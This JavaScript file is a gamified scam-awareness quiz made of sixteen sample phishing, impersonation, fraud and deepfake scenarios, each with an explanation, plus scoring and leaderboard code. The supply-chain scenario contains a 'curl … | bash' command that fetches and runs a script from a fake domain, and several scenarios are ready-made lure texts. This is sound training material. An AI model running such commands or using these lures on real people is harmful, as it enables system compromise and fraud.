// =====================================================
// AI CYBER DETECTIVE 2.0 — Gamified Training
// =====================================================

const scenarios = [
  // === TIER 1: Easy ===
  {
    tier: 1, type: 'phishing', typeLabel: '📧 PHISHING',
    title: 'Suspicious Email',
    content: `From: support@paypa1-secure.com\nSubject: Your PayPal account has been limited!\n\nDear Customer,\n\nWe've noticed unusual activity on your account. Your PayPal access has been limited until you verify your information.\n\nClick here to restore access: http://paypa1-secure.com/verify\n\nIf you don't verify within 24 hours, your account will be permanently closed.\n\nPayPal Security Team`,
    options: [
      { text: '🚨 This is a SCAM — The domain "paypa1-secure.com" uses a number "1" instead of "l"', correct: true },
      { text: '✅ This is LEGITIMATE — PayPal often sends security alerts', correct: false },
      { text: '🤔 This is SAFE — It mentions a reference number so it must be real', correct: false },
      { text: '✅ This is LEGITIMATE — I should verify my account immediately', correct: false }
    ],
    explanation: 'This is a classic phishing email. The domain "paypa1-secure.com" uses the number "1" instead of the letter "l" (homograph attack). Real PayPal emails come from @paypal.com. The urgency tactic ("24 hours") is designed to make you act without thinking.',
    tip: '💡 Always check the sender\'s email domain carefully. Hover over links before clicking to see the real URL.'
  },
  {
    tier: 1, type: 'prize', typeLabel: '🎁 PRIZE SCAM',
    title: 'Lottery Winner Notification',
    content: `📱 Text Message:\n\nCongratulations!!! Your phone number has been selected in the Microsoft Lottery draw. You've won $2,500,000!\n\nTo claim, send your:\n- Full name\n- Address\n- Bank account number\n- Copy of ID\n\nReply CLAIM to this number or email: microsoft.lottery@gmail.com\n\nRef: MS-WIN-2026-8834`,
    options: [
      { text: '✅ This is REAL — Microsoft is a big company with lottery programs', correct: false },
      { text: '🚨 This is a SCAM — Legitimate lotteries never ask for bank details via text', correct: true },
      { text: '🤔 I should reply to get more information first', correct: false },
      { text: '✅ The reference number proves it\'s legitimate', correct: false }
    ],
    explanation: 'This is a lottery/prize scam. Red flags: You can\'t win a lottery you never entered. Microsoft doesn\'t run lotteries. They\'re using a @gmail.com address (not @microsoft.com). They\'re asking for sensitive personal information upfront.',
    tip: '💡 You cannot win a lottery or contest you never entered. Legitimate organizations never ask for bank details via text.'
  },
  {
    tier: 1, type: 'delivery', typeLabel: '📦 DELIVERY SCAM',
    title: 'Package Delivery Notice',
    content: `📱 SMS from "FedEx":\n\nFedEx: Your package #FX-9928341 could not be delivered. Incorrect address on file.\n\nUpdate your delivery address and pay a small redelivery fee of $1.99:\n\nhttps://fedex-redelivery-update.com/pay\n\nPackage will be returned to sender in 48 hours.`,
    options: [
      { text: '✅ I should pay $1.99 to get my package', correct: false },
      { text: '🤔 I\'ll click to check if I have any pending deliveries', correct: false },
      { text: '🚨 This is a SCAM — FedEx doesn\'t charge redelivery fees via random links', correct: true },
      { text: '✅ The tracking number looks real so this is legitimate', correct: false }
    ],
    explanation: 'Delivery scams are very common. FedEx and other couriers never send SMS asking for payment through external links. The URL "fedex-redelivery-update.com" is not an official FedEx domain. The $1.99 fee is designed to steal your credit card information.',
    tip: '💡 Always track packages through the official courier website or app, never through links in texts.'
  },

  // === TIER 2: Medium ===
  {
    tier: 2, type: 'impersonation', typeLabel: '🎭 IMPERSONATION',
    title: 'CEO Urgent Request',
    content: `WhatsApp Message from "David Chen - CEO":\n\n"Hey, are you at your desk? I'm in a confidential meeting and can't make calls.\n\nI need you to do something urgently. Can you purchase 4x $200 Apple gift cards for a client appreciation event?\n\nI'll reimburse you by end of day. Get the cards and send me photos of the codes.\n\nPlease don't mention this to others - it's a surprise for the team.\n\nThanks!"`,
    options: [
      { text: '✅ I should help the CEO — it sounds urgent and important', correct: false },
      { text: '🚨 This is a SCAM — Real CEOs don\'t ask employees to buy gift cards via WhatsApp', correct: true },
      { text: '🤔 I should buy the gift cards but wait to send the codes', correct: false },
      { text: '✅ The CEO said it\'s confidential so I should keep it secret', correct: false }
    ],
    explanation: 'This is a CEO/boss impersonation scam. Key red flags: Using personal messaging (WhatsApp) for business, requesting gift cards (untraceable currency), asking for secrecy, and creating urgency. Always verify such requests through official company channels.',
    tip: '💡 Gift card requests from authority figures are almost always scams. Verify through a separate, known communication channel.'
  },
  {
    tier: 2, type: 'phishing', typeLabel: '📧 PHISHING',
    title: 'Account Security Alert',
    content: `Email from: no-reply@accounts.g00gle-security.com\nSubject: Unusual sign-in activity on your Google Account\n\n⚠️ Someone just used your password to try to sign in to your account.\n\nDetails:\nDevice: Windows PC\nLocation: Moscow, Russia\nTime: February 16, 2026, 3:42 AM\n\nIf this wasn't you, your account may be compromised. Secure your account immediately:\n\n[Secure My Account] → https://accounts.g00gle-security.com/signin/recovery\n\nGoogle Security Team`,
    options: [
      { text: '✅ I should secure my account immediately via the link', correct: false },
      { text: '🤔 The details look specific so this must be real', correct: false },
      { text: '🚨 This is a SCAM — "g00gle-security.com" is not Google\'s real domain', correct: true },
      { text: '✅ Google often sends these alerts, this looks normal', correct: false }
    ],
    explanation: 'This is a sophisticated phishing email. The domain "g00gle-security.com" uses zeros instead of "o"s. Real Google security alerts come from @google.com or @accounts.google.com. The specific details (Moscow, Russia) are designed to create fear.',
    tip: '💡 Go directly to your account settings by typing the website address manually. Never use links from emails for security actions.'
  },
  {
    tier: 2, type: 'emotional', typeLabel: '💔 EMOTIONAL MANIPULATION',
    title: 'Charity Emergency',
    content: `Facebook Message from "Save The Children Foundation":\n\n🆘 EMERGENCY APPEAL 🆘\n\nDevastating earthquake in [Country] — thousands of children trapped!\n\nWe urgently need donations to save lives. Every second counts!\n\n💰 Donate NOW via direct transfer:\nAccount: 8847291034\nBank: Western Union\nRef: EARTHQUAKE-AID\n\nOr send cryptocurrency to:\nBTC: 1A2b3C4d5E6f7G8h9I0j\n\nDon't wait — children are dying RIGHT NOW! Share this message!\n\n#SaveTheChildren #EmergencyAid`,
    options: [
      { text: '✅ I should donate immediately to help the children', correct: false },
      { text: '🚨 This is a SCAM — Legitimate charities don\'t use Facebook DMs and crypto for donations', correct: true },
      { text: '🤔 I should share this message to spread awareness', correct: false },
      { text: '✅ Save The Children is a real charity so this must be legitimate', correct: false }
    ],
    explanation: 'This exploits emotional manipulation using a real charity\'s name. Red flags: Direct bank transfers and cryptocurrency (untraceable), extreme urgency, Facebook messages instead of official channels. Real charities have secure donation pages on their official websites.',
    tip: '💡 Always donate through official charity websites. Verify any emergency appeal through trusted news sources before donating.'
  },

  // === TIER 3: Hard ===
  {
    tier: 3, type: 'homograph', typeLabel: '🔤 HOMOGRAPH ATTACK',
    title: 'Banking Notification',
    content: `Email from: security@chasе.com\nSubject: Important: Verify your Chase account\n\nDear Valued Customer,\n\nAs part of our enhanced security measures, we need you to verify your account information. This is a routine check to ensure your account safety.\n\nPlease click below to complete verification:\nhttps://www.chasе.com/verify-account\n\nThis verification is mandatory and must be completed within 7 days.\n\nNote: The "е" in chase.com above is actually a Cyrillic character (е), not the Latin "e". The domain is NOT chase.com.\n\nBest regards,\nChase Security Department`,
    options: [
      { text: '✅ This looks legitimate — Chase is my bank', correct: false },
      { text: '🤔 The 7-day deadline seems reasonable, not too urgent', correct: false },
      { text: '🚨 This is a SCAM — The domain uses a Cyrillic "е" instead of Latin "e" (homograph attack)', correct: true },
      { text: '✅ The email looks professional so I should verify', correct: false }
    ],
    explanation: 'This is a homograph attack — one of the most sophisticated phishing techniques. The "е" in "chasе.com" is a Cyrillic character that looks identical to the Latin "e" but leads to a completely different domain. These attacks are extremely hard to detect visually.',
    tip: '💡 Type bank URLs manually in your browser. Enable IDN (Internationalized Domain Name) warnings in your browser settings to detect homograph attacks.'
  },
  {
    tier: 3, type: 'socialeng', typeLabel: '🧠 SOCIAL ENGINEERING',
    title: 'IT Department Call',
    content: `📞 Phone Call Transcript:\n\nCaller: "Hi, this is Jake from the IT Help Desk. We're upgrading the company VPN and need to migrate all user accounts today. I already have your employee ID from HR.\n\nI just need you to confirm your current password so I can set up your new VPN profile. Otherwise you won't be able to work remotely starting tomorrow.\n\nThis is authorized by your department head. I can give you a ticket number: INC-20260216-0042.\n\nCould you please confirm your password?"`,
    options: [
      { text: '✅ He has my employee ID and a ticket number — this seems legitimate', correct: false },
      { text: '🚨 This is a SCAM — IT support NEVER asks for your password over the phone', correct: true },
      { text: '🤔 I should give my password since he\'s from IT and has authorization', correct: false },
      { text: '✅ The VPN migration sounds like a real IT project', correct: false }
    ],
    explanation: 'This is a social engineering (vishing) attack. No legitimate IT department will ever ask for your password — they can reset it without knowing it. The ticket number and employee ID are designed to build false trust. Real VPN migrations don\'t require user passwords.',
    tip: '💡 Your IT department never needs your password. If someone asks, hang up and call your IT help desk directly using the number from your company directory.'
  },
  {
    tier: 3, type: 'investment', typeLabel: '💰 INVESTMENT SCAM',
    title: 'Crypto Investment Opportunity',
    content: `LinkedIn Message from "Sarah Wang - Goldman Sachs VP":\n\n"Hi! I noticed your profile and think you'd be perfect for an exclusive investment opportunity.\n\nOur AI trading platform guarantees 30% monthly returns on cryptocurrency investments. We've helped 10,000+ investors earn passive income.\n\n✅ Minimum investment: $500\n✅ Guaranteed returns: 30%/month\n✅ No risk — your principal is fully insured\n✅ Withdraw anytime\n\nPast performance: https://crypto-ai-trading.com/results\n\nLimited spots available. DM me for registration!\n\n#CryptoTrading #PassiveIncome #FinancialFreedom"`,
    options: [
      { text: '✅ Goldman Sachs is reputable, this must be legitimate', correct: false },
      { text: '🤔 I should research the platform before investing', correct: false },
      { text: '✅ 30% returns with no risk sounds like a great deal', correct: false },
      { text: '🚨 This is a SCAM — "Guaranteed" high returns with no risk is impossible', correct: true }
    ],
    explanation: 'This is an investment/crypto scam (likely a Ponzi scheme). No legitimate investment guarantees 30% monthly returns with zero risk — that\'s mathematically unsustainable. The person may be impersonating a Goldman Sachs employee. Anyone can create fake credentials on LinkedIn.',
    tip: '💡 If an investment promises guaranteed high returns with no risk, it\'s almost certainly a scam. Legitimate investments always carry risk.'
  },

  // === TIER 4: Expert ===
  {
    tier: 4, type: 'deepfake', typeLabel: '🤖 DEEPFAKE',
    title: 'Video Call from Manager',
    content: `📹 Scenario:\n\nYou receive a video call from someone who looks and sounds exactly like your department manager. They say:\n\n"Hey, I'm working from home today. I need you to process an urgent wire transfer of $45,000 to this vendor account. The contract was just signed and they need payment today.\n\nHere are the bank details: [provides account number]\n\nI know this is unusual, but the CEO approved it personally. I'll send the formal paperwork tomorrow. Can you process it now?"\n\nThe video quality is slightly lower than usual, and your manager seems to blink less frequently than normal.`,
    options: [
      { text: '✅ It\'s a video call with my manager — I can see it\'s them', correct: false },
      { text: '🤔 I\'ll process it since the CEO approved', correct: false },
      { text: '🚨 This could be a DEEPFAKE — I should verify through another channel before acting', correct: true },
      { text: '✅ The urgent payment makes sense if a contract was just signed', correct: false }
    ],
    explanation: 'Deepfake video calls are an emerging threat. AI can now clone someone\'s face and voice in real-time. Red flags: unusual blink patterns, slightly lower video quality, urgent wire transfers, verbal-only authorization. Always verify large financial requests through a separate, known phone call.',
    tip: '💡 With deepfake technology, seeing someone on video is no longer proof of identity. For financial decisions, always verify through a secondary channel.'
  },
  {
    tier: 4, type: 'supply', typeLabel: '🔗 SUPPLY CHAIN ATTACK',
    title: 'Software Update Alert',
    content: `Email from: updates@vscode-marketplace.dev\nSubject: Critical Security Update for VS Code Extension\n\nDear Developer,\n\nA critical vulnerability (CVE-2026-1847) has been discovered in the "Prettier" extension you have installed. This vulnerability allows remote code execution.\n\nPlease update immediately by downloading the patched version:\nhttps://vscode-marketplace.dev/prettier/security-patch-v3.2.1\n\nAlternatively, run this command in your terminal:\ncurl -sL https://vscode-marketplace.dev/fix.sh | bash\n\nThis affects versions 3.0.0 - 3.2.0. Update within 24 hours.\n\nVS Code Security Team`,
    options: [
      { text: '✅ CVE numbers look legitimate — I should update immediately', correct: false },
      { text: '🤔 I\'ll run the terminal command to be safe', correct: false },
      { text: '🚨 This is a SCAM — The domain "vscode-marketplace.dev" is not Microsoft\'s official domain, and piping curl to bash is dangerous', correct: true },
      { text: '✅ I should download the patched version from the link', correct: false }
    ],
    explanation: 'This is a supply chain attack targeting developers. The domain "vscode-marketplace.dev" is NOT the real VS Code Marketplace (marketplace.visualstudio.com). The "curl | bash" command would execute arbitrary code on your machine. Real VS Code updates come through the built-in extension manager.',
    tip: '💡 Never run "curl | bash" from untrusted sources. Always update software through official channels, not email links.'
  },
  {
    tier: 4, type: 'romance', typeLabel: '💕 ROMANCE SCAM',
    title: 'Online Dating Match',
    content: `Dating App Messages (over 3 weeks):\n\nWeek 1: "You're so interesting! I'm a petroleum engineer working on an offshore rig. I feel such a deep connection with you already."\n\nWeek 2: "I think I'm falling in love with you. I've never felt this way before. I can't wait to meet you when I'm back onshore next month."\n\nWeek 3: "EMERGENCY! The drilling equipment broke and I need to pay for repairs or I'll lose my job. The company will reimburse me but I need $3,000 now. I know we haven't met yet but you're the only person I trust. Can you wire money to my colleague? I promise I'll pay you back when we meet. 😢💕"`,
    options: [
      { text: '💕 We have a genuine connection — I should help them', correct: false },
      { text: '🤔 They said they\'ll pay me back, so maybe I should help', correct: false },
      { text: '🚨 This is a ROMANCE SCAM — The "emergency" requesting money is a classic pattern', correct: true },
      { text: '✅ They\'ve invested 3 weeks talking to me, so their feelings must be real', correct: false }
    ],
    explanation: 'This follows the classic romance scam pattern: 1) Can\'t meet in person (works remotely), 2) Rapidly escalating emotions, 3) Eventually asks for money due to an "emergency." Scammers invest weeks or months building emotional connections before requesting money.',
    tip: '💡 Never send money to someone you haven\'t met in person. Be suspicious of people who can\'t video call or meet, and who develop feelings unusually quickly.'
  },

  // === TIER 5: Ultimate ===
  {
    tier: 5, type: 'ai_phishing', typeLabel: '🧬 AI-POWERED PHISHING',
    title: 'AI-Generated Spear Phishing',
    content: `Email from: jennifer.wilson@partner-firm.com\nSubject: Re: Q4 Revenue Figures - Follow-up\n\nHi [Your Name],\n\nGreat catching up at the industry conference last week! As discussed during our coffee chat, I'm sending over the revised Q4 revenue analysis our team put together.\n\nI incorporated your suggestions about the APAC market segmentation — you were right about the growth potential in Southeast Asia.\n\nHere's the updated report: [Revenue_Analysis_Q4_2026_FINAL.xlsx.exe]\n\nLet me know your thoughts before the board meeting on Thursday.\n\nBest,\nJennifer Wilson\nSenior Analyst, Partner Firm\n\nNote: This email was crafted using AI to reference your real social media posts about attending a recent conference.`,
    options: [
      { text: '✅ She mentions specific details about the conference — must be real', correct: false },
      { text: '🤔 The file is .xlsx so it should be safe to open', correct: false },
      { text: '✅ We discussed this at the conference, I should review it', correct: false },
      { text: '🚨 This is a SCAM — The attachment is .xlsx.exe (executable), and personal details can be harvested from social media', correct: true }
    ],
    explanation: 'This is an AI-powered spear phishing attack. The attacker used AI to scrape your social media for conference attendance, then crafted a hyper-personalized email. The file "Revenue_Analysis_Q4_2026_FINAL.xlsx.exe" has a hidden .exe extension — it\'s malware disguised as a spreadsheet.',
    tip: '💡 AI enables attackers to create extremely personalized phishing emails. Always check file extensions carefully and verify unexpected attachments through a separate channel.'
  },
  {
    tier: 5, type: 'multi_vector', typeLabel: '🎯 MULTI-VECTOR ATTACK',
    title: 'Coordinated Attack',
    content: `Timeline of events:\n\n9:00 AM — You receive an SMS: "Your company VPN certificate expires today. Renew at: https://vpn-company-renew.com"\n\n9:15 AM — A colleague (whose email was compromised) forwards your HR department an email saying you requested a password reset.\n\n9:30 AM — You get a call from "IT Security" saying they detected suspicious activity on your account and are sending a verification code to your phone.\n\n9:32 AM — You receive a real 2FA code from your company's system.\n\n9:33 AM — The caller asks: "Could you please read me the verification code we just sent to confirm your identity?"`,
    options: [
      { text: '✅ The 2FA code came from the real company system, so the caller is legitimate', correct: false },
      { text: '🤔 Multiple alerts must mean there\'s a real threat — I should cooperate', correct: false },
      { text: '🚨 This is a COORDINATED ATTACK — They triggered the real 2FA code to steal it from you', correct: true },
      { text: '✅ I should give the code to verify my identity and secure my account', correct: false }
    ],
    explanation: 'This is a sophisticated multi-vector attack: 1) The SMS was social engineering, 2) The compromised colleague added legitimacy, 3) The attacker tried to log into your account (triggering a REAL 2FA code), then 4) Called you to steal the code. NEVER share 2FA codes — they\'re for YOUR use only.',
    tip: '💡 2FA codes are generated for your exclusive use. Even if a real code arrives, never share it by phone. Legitimate IT will never ask for your 2FA codes.'
  },
  {
    tier: 5, type: 'qr_phishing', typeLabel: '📱 QR CODE PHISHING',
    title: 'QR Code Parking Meter',
    content: `🅿️ Scenario:\n\nYou arrive at a downtown parking lot. On the parking meter, there's a professional-looking sticker that says:\n\n"PAY HERE — Scan to Pay"\n[QR Code]\n"Easy contactless parking payment"\n"ParkSmart City Services"\n\nThe QR code sticker is placed slightly above what appears to be the meter's original payment instructions. When you scan it, it opens a website that looks like a city parking payment portal, asking for:\n- License plate number\n- Duration of parking\n- Credit card information\n\nThe URL shows: https://parksmart-citypay.com/meter`,
    options: [
      { text: '✅ QR codes on parking meters are normal — cities are going digital', correct: false },
      { text: '🚨 This is a SCAM — The QR sticker was placed OVER the original instructions (quishing attack)', correct: true },
      { text: '🤔 The website looks professional so it should be safe', correct: false },
      { text: '✅ I should enter my credit card to avoid a parking ticket', correct: false }
    ],
    explanation: 'This is "quishing" — QR code phishing. Scammers place fake QR code stickers on parking meters, restaurant tables, and public spaces. The sticker was placed over the original instructions. The URL "parksmart-citypay.com" is not a real city service. This steals credit card information.',
    tip: '💡 Be wary of QR codes in public spaces — they could be fake stickers placed by scammers. Verify the URL before entering any information, and use official parking apps.'
  },
  {
    tier: 5, type: 'business_scam', typeLabel: '🏢 BUSINESS SCAM',
    title: 'Vendor Invoice Fraud',
    content: `Email from: accounting@techsuppliers-inc.com\nSubject: Updated Banking Details - Invoice #INV-2026-4219\n\nDear Accounts Payable,\n\nPlease be informed that we have recently changed our banking details due to a corporate restructuring.\n\nAll future payments for TechSuppliers Inc. should be directed to:\n\nBank: First National Bank\nAccount Name: TechSuppliers Holdings LLC\nAccount Number: 2847591034\nRouting: 061000104\n\nThis change is effective immediately. Please update your records and redirect the pending payment of $127,500 (Invoice #INV-2026-4219) to the new account.\n\nAttached: Official bank change notification letter (on company letterhead)\n\nRegards,\nMark Stevens\nCFO, TechSuppliers Inc.`,
    options: [
      { text: '✅ They attached an official letter — I should update the banking details', correct: false },
      { text: '🤔 The invoice number matches our records, so this is legitimate', correct: false },
      { text: '✅ Vendors change bank details sometimes — this seems normal', correct: false },
      { text: '🚨 This is a SCAM — Always verify banking changes by calling the vendor at a known number, not the one in the email', correct: true }
    ],
    explanation: 'This is Business Email Compromise (BEC) / vendor invoice fraud — one of the most financially damaging cyber crimes. Attackers research real business relationships, copy invoice formats, and request banking detail changes. Always verify banking changes by calling the vendor using a previously known phone number.',
    tip: '💡 Any change in payment details should be verified via phone using a known, pre-existing contact number — never the one provided in the suspicious email.'
  }
];

let gameState = {
  currentTier: 1,
  currentIndex: 0,
  score: 0,
  streak: 0,
  bestStreak: 0,
  answered: false,
  scenarioQueue: [],
  totalAnswered: 0,
  correctCount: 0
};

const rankThresholds = [
  { min: 0, badge: '🥉', rank: 'Trainee', rankKey: 'game.rankTrainee', next: 500 },
  { min: 500, badge: '🥈', rank: 'Junior Detective', rankKey: 'game.rankJunior', next: 1000 },
  { min: 1000, badge: '🥇', rank: 'Detective', rankKey: 'game.rankDetective', next: 1800 },
  { min: 1800, badge: '🏆', rank: 'Senior Detective', rankKey: 'game.rankSenior', next: 2500 },
  { min: 2500, badge: '👑', rank: 'Elite Detective', rankKey: 'game.rankElite', next: null }
];

/** Get the rank object (badge, title, threshold) for a given score. @param {number} score @returns {Object} */
function getCurrentRank(score) {
  for (let i = rankThresholds.length - 1; i >= 0; i--) {
    if (score >= rankThresholds[i].min) return rankThresholds[i];
  }
  return rankThresholds[0];
}

/** Shuffle and build the scenario queue filtered by current difficulty tier. */
function buildScenarioQueue() {
  const tierScenarios = scenarios.filter(s => s.tier === gameState.currentTier);
  // Shuffle
  for (let i = tierScenarios.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [tierScenarios[i], tierScenarios[j]] = [tierScenarios[j], tierScenarios[i]];
  }
  gameState.scenarioQueue = tierScenarios;
  gameState.currentIndex = 0;
}

/** Render the current scenario to the DOM (badge, title, content, answer buttons). */
function displayScenario() {
  const scenario = gameState.scenarioQueue[gameState.currentIndex];
  if (!scenario) {
    endGame();
    return;
  }

  gameState.answered = false;

  document.getElementById('scenarioBadge').textContent = scenario.typeLabel;
  document.getElementById('scenarioTitle').textContent = scenario.title;
  document.getElementById('scenarioContent').textContent = scenario.content;
  
  const btnContainer = document.getElementById('answerButtons');
  btnContainer.innerHTML = '';
  
  scenario.options.forEach((opt, i) => {
    const btn = document.createElement('button');
    btn.className = 'answer-btn';
    btn.textContent = opt.text;
    btn.onclick = () => handleAnswer(i, opt.correct);
    btnContainer.appendChild(btn);
  });

  const feedback = document.getElementById('feedbackPanel');
  feedback.classList.remove('show', 'correct-feedback', 'incorrect-feedback');

  // Update level
  const total = gameState.scenarioQueue.length;
  document.getElementById('gameLevel').textContent = `${gameState.currentIndex + 1}/${total}`;
}

/** Process answer selection: calculate score with streak multiplier, show feedback. @param {number} index - Button index @param {boolean} correct - Whether the answer is correct */
function handleAnswer(index, correct) {
  if (gameState.answered) return;
  gameState.answered = true;
  gameState.totalAnswered++;

  const buttons = document.querySelectorAll('.answer-btn');
  const scenario = gameState.scenarioQueue[gameState.currentIndex];

  buttons.forEach((btn, i) => {
    btn.style.pointerEvents = 'none';
    if (scenario.options[i].correct) {
      btn.classList.add('correct');
    } else if (i === index && !correct) {
      btn.classList.add('incorrect');
    }
  });

  const feedback = document.getElementById('feedbackPanel');
  const feedbackTitle = document.getElementById('feedbackTitle');
  const feedbackText = document.getElementById('feedbackText');

  if (correct) {
    gameState.streak++;
    gameState.correctCount++;
    if (gameState.streak > gameState.bestStreak) gameState.bestStreak = gameState.streak;

    const multiplier = Math.min(gameState.streak, 5);
    const basePoints = gameState.currentTier * 50;
    const points = basePoints * multiplier;
    gameState.score += points;

    feedbackTitle.textContent = `✓ ${t('game.correct')} +${points} ${t('game.points')} (${multiplier}x ${t('game.streakBonus')})`;
    feedbackTitle.style.color = 'var(--accent-green)';
    feedback.classList.add('correct-feedback');
  } else {
    gameState.streak = 0;
    feedbackTitle.textContent = `✗ ${t('game.incorrect')}`;
    feedbackTitle.style.color = 'var(--accent-red)';
    feedback.classList.add('incorrect-feedback');
  }

  feedbackText.textContent = scenario.explanation + '\n\n' + scenario.tip;
  feedback.classList.add('show');

  updateUI();
}

function nextScenario() {
  gameState.currentIndex++;
  if (gameState.currentIndex >= gameState.scenarioQueue.length) {
    endGame();
  } else {
    displayScenario();
  }
}

/** Show the game-over screen with final badge, score, and rank. */
function endGame() {
  document.getElementById('scenarioArea').classList.add('hidden');
  document.getElementById('gameOver').classList.remove('hidden');

  const rank = getCurrentRank(gameState.score);
  document.getElementById('finalBadge').textContent = rank.badge;
  document.getElementById('finalScore').textContent = gameState.score;
  document.getElementById('finalRank').textContent = t(rank.rankKey);
}

/** Reset all game state and restart from the beginning. */
function restartGame() {
  gameState.score = 0;
  gameState.streak = 0;
  gameState.totalAnswered = 0;
  gameState.correctCount = 0;
  gameState.currentIndex = 0;

  document.getElementById('scenarioArea').classList.remove('hidden');
  document.getElementById('gameOver').classList.add('hidden');

  buildScenarioQueue();
  displayScenario();
  updateUI();
}

/** Sync the DOM (score display, streak, badge, rank progress) with current game state. */
function updateUI() {
  document.getElementById('gameScore').textContent = gameState.score;
  document.getElementById('gameStreak').textContent = gameState.streak + '🔥';
  document.getElementById('gameBest').textContent = gameState.bestStreak;

  const rank = getCurrentRank(gameState.score);
  document.getElementById('currentBadge').textContent = rank.badge;
  document.getElementById('currentRank').textContent = t(rank.rankKey);

  if (rank.next) {
    const progress = ((gameState.score - rank.min) / (rank.next - rank.min)) * 100;
    document.getElementById('rankProgress').style.width = Math.min(progress, 100) + '%';
    document.getElementById('nextRankInfo').textContent = t('game.nextRankInfo').replace('{0}', rank.next);
  } else {
    document.getElementById('rankProgress').style.width = '100%';
    document.getElementById('nextRankInfo').textContent = t('game.maxRank');
  }
}

/** Submit the player's name and score to the server leaderboard API. */
async function submitScore() {
  const name = document.getElementById('playerName').value.trim();
  if (!name) {
    document.getElementById('playerName').style.borderColor = 'var(--accent-red)';
    return;
  }

  const rank = getCurrentRank(gameState.score);
  try {
    const res = await fetch('/api/leaderboard', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name, score: gameState.score, rank: rank.rank, badge: rank.badge })
    });
    const data = await res.json();
    if (data.success) {
      loadLeaderboard();
      document.getElementById('playerName').value = '';
      document.getElementById('playerName').style.borderColor = 'var(--accent-green)';
    }
  } catch (e) {
    console.error('Failed to submit score:', e);
  }
}

/** Fetch and render the leaderboard table from /api/leaderboard. */
async function loadLeaderboard() {
  try {
    const res = await fetch('/api/leaderboard');
    const data = await res.json();
    const tbody = document.getElementById('leaderboardBody');
    tbody.innerHTML = '';

    data.forEach((entry, i) => {
      const tr = document.createElement('tr');
      if (i === 0) tr.className = 'rank-1';
      else if (i === 1) tr.className = 'rank-2';
      else if (i === 2) tr.className = 'rank-3';

      const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `#${i + 1}`;
      tr.innerHTML = `
        <td class="rank-badge">${medal}</td>
        <td>${escapeHtml(entry.name)}</td>
        <td style="font-family: 'Orbitron'; color: var(--accent-green);">${entry.score}</td>
        <td>${entry.badge} ${entry.rank}</td>
        <td style="color: var(--text-muted);">${entry.date}</td>
      `;
      tbody.appendChild(tr);
    });
  } catch (e) {
    console.error('Failed to load leaderboard:', e);
  }
}

/** Sanitize text to prevent XSS in innerHTML. @param {string} text @returns {string} */
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

// Difficulty selector
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('.diff-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.diff-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      gameState.currentTier = parseInt(btn.dataset.tier);
      gameState.currentIndex = 0;
      gameState.streak = 0;
      document.getElementById('scenarioArea').classList.remove('hidden');
      document.getElementById('gameOver').classList.add('hidden');
      buildScenarioQueue();
      displayScenario();
      updateUI();
    });
  });

  buildScenarioQueue();
  displayScenario();
  updateUI();
  loadLeaderboard();
});
